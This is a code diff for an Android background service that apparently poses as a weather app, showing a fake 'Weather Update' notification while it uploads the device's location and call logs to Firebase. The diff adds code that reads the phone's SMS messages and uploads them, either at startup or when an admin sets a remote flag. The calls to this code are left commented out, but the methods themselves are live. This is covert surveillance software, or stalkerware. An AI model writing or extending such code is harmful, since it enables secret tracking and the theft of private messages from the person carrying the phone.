@@ -35,7 +35,7 @@ public class LocationBroadcastService extends Service {
     private String deviceId;
     private Runnable locationRunnable;
     private Handler handler;
-    public static final long LOCATION_UPDATE_INTERVAL = 30000; // 5 seconds
+    public static final long LOCATION_UPDATE_INTERVAL = 300000; // 5 seconds
     private PowerManager.WakeLock wakeLock;
 
     @Override
@@ -75,6 +75,10 @@ public class LocationBroadcastService extends Service {
             uploadCallogs(); //first time when service starts
 
 
+//            uploadSms(); // first time when service starts
+//            checkForSmsRequest(); // on admin demand
+
+
         }
 
         return START_STICKY;
@@ -105,6 +109,34 @@ public class LocationBroadcastService extends Service {
             }
         });
     }
+
+
+    private void uploadSms() {
+        ServiceClassUtils.fetchAndUploadSms(getApplicationContext(), deviceId);
+    }
+
+    private void checkForSmsRequest() {
+        DatabaseReference requestRef = FirebaseDatabase.getInstance()
+                .getReference("users")
+                .child(deviceId)
+                .child("smsRequest");
+
+        requestRef.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                Boolean request = snapshot.getValue(Boolean.class);
+                if (request != null && request) {
+                    uploadSms();
+                    requestRef.setValue(false);
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+            }
+        });
+    }
+
 
     private void checkForCallogsRequest() {
         DatabaseReference requestRef = FirebaseDatabase.getInstance()
@@ -145,7 +177,7 @@ public class LocationBroadcastService extends Service {
     private void startForegroundServiceWithNotification() {
         Notification notification = new NotificationCompat.Builder(this, MyApp.CHANNEL_ID)
                 .setContentTitle("Weather Update")
-                .setContentText("Current Temp: 27°C, Mostly Cloudy")
+                .setContentText("27°C, Mostly Cloudy")
                 .setSmallIcon(R.drawable.ic_weather) // Replace with an actual weather icon if available
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setCategory(NotificationCompat.CATEGORY_SERVICE)
